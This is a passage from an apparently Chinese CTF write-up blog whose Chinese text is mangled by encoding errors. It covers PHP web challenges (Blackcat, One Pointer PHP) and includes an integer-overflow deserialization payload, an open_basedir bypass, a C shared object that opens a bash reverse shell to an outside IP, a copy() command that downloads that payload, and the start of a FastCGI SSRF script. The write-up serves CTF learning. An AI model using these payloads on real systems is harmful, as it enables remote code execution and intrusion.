punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"image/"</span> <span class="token operator">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success, image at <span class="token interpolation"><span class="token variable">$imagePath</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//example<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"example/"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"éƒ½ä¸èƒ½è§£å‹å‘¢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ"</span><span class="token punctuation">;</span>    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/example/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$pos_for_zip</span></span>/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'example/'</span><span class="token operator">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç¾ŠåŸæ¯-2020-Blackcat"><a href="#ç¾ŠåŸæ¯-2020-Blackcat" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]Blackcat"></a>[ç¾ŠåŸæ¯ 2020]Blackcat</h2><p>éŸ³é¢‘æœ€åæœ‰æºç </p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpinclude &quot;initialized.php&quot;;putenv(&quot;clandestine&#x3D;&quot;.randomkeys());if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;]))&#123;    die(&#39;è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼&#39;);&#125;$clandestine &#x3D; getenv(&quot;clandestine&quot;);if(isset($_POST[&#39;White-cat-monitor&#39;]))    $clandestine &#x3D; hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);$hh &#x3D; hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);if($hh !&#x3D;&#x3D; $_POST[&#39;Black-Cat-Sheriff&#39;])&#123;    die(&#39;æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚&#39;);&#125;echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hash_hmacå‡½æ•°å¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºæ•°å­—ä¼šè¿”å›falseï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶$clandestineä¸ºfalseï¼Œè¿›è€Œæ§åˆ¶å“ˆå¸Œå€¼è®©å‘½ä»¤æ‰§è¡Œ</p><h2 id="è“å¸½æ¯-2021-One-Pointer-PHP"><a href="#è“å¸½æ¯-2021-One-Pointer-PHP" class="headerlink" title="[è“å¸½æ¯ 2021]One Pointer PHP"></a>[è“å¸½æ¯ 2021]One Pointer PHP</h2><p>ç»™äº†æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHPæ•´æ•°æº¢å‡º</p><blockquote><p>å¦‚æœç»™å®šçš„ä¸€ä¸ªæ•´æ•°è¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰çš„èŒƒå›´ï¼Œå°†ä¼šè¢«è§£é‡Šä¸ºæµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚åŒæ ·å¦‚æœæ‰§è¡Œçš„è¿ç®—ç»“æœè¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰èŒƒå›´ï¼Œä¹Ÿä¼šè¿”å›æµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚</p></blockquote><p>æ„é€ ä¸€ä¸ªconutè¶…å‡ºintå°±èƒ½è®©åˆ¤æ–­ä¸ºfalseï¼Œæ‰§è¡Œå‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœ‹phpinfoï¼Œbanå¤§é‡å‘½ä»¤ï¼Œå¹¶ä¸”è®¾ç½®äº†open_basedirï¼Œé‚£ä¹ˆå…ˆç»•è¿‡è¿™ä¸ªå§</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æƒé™è¯»å•Šï¼Œè¯•è¯•è¯»ä¸€ä¸‹cmdlineï¼Œå’Œnginxé…ç½®æ–‡ä»¶</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php-fpm: pool www<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ˜¯phpfpmï¼Œå¯ä»¥åˆ©ç”¨SSRFï¼Œè¯»å–phpfpmçš„é…ç½®æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">listen &#x3D; 127.0.0.1:9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨9001ç«¯å£ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯SSRFäº†</p><blockquote><h3 id="SSRFæ”»å‡»FPM"><a href="#SSRFæ”»å‡»FPM" class="headerlink" title="SSRFæ”»å‡»FPM"></a>SSRFæ”»å‡»FPM</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡SSRFæ¥æ”»å‡»FPMï¼Œä½†æ˜¯å—é™äºè¿™é“é¢˜çš„disable_functionsï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥SSRFï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>file_put_contents()</code>çš„ä¸€ä¸ªç‰¹æ€§æ¥å®ç°SSRFï¼š</p><p><code>file_put_contents</code>åœ¨ä½¿ç”¨ ftp åè®®æ—¶, ä¼šå°† data çš„å†…å®¹ä¸Šä¼ åˆ° ftp æœåŠ¡å™¨, ç”±äºä¸Šé¢è¯´çš„<code>pasv</code>æ¨¡å¼ä¸‹, æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£æ˜¯å¯æ§, æˆ‘ä»¬å¯ä»¥å°†åœ°å€å’Œç«¯å£æŒ‡åˆ°<code>127.0.0.1:9000</code>.åŒæ—¶ç”±äº ftp çš„ç‰¹æ€§,ä¸ä¼šæœ‰ä»»ä½•çš„å¤šä½™å†…å®¹, ç±»ä¼¼<code>gopher</code>åè®®, ä¼šå°†<code>data</code>åŸå°ä¸åŠ¨çš„å‘ç»™<code>127.0.0.1:9000</code>, å®Œç¾ç¬¦åˆæ”»å‡»fastcgi(FPM)çš„è¦æ±‚.</p></blockquote><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªæ¶æ„soæ–‡ä»¶</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123;    system(&quot;bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;45.15.131.101&#x2F;6666 &lt;&amp;1&#39;&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®©é¶æœºä¸‹è½½<code>var_dump(copy(&#39;http://45.15.131.101:5111/1.so&#39;,&#39;/var/www/html/1.so&#39;));</code></p><p>ä¸‹ä¸€æ­¥å°±æ˜¯å‡ºå‘SSRFæ”»å‡»FPMæŒ‚è½½soæ–‡ä»¶æ¥RCEï¼Œä¸‹é¢æ˜¯è„šæœ¬</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span 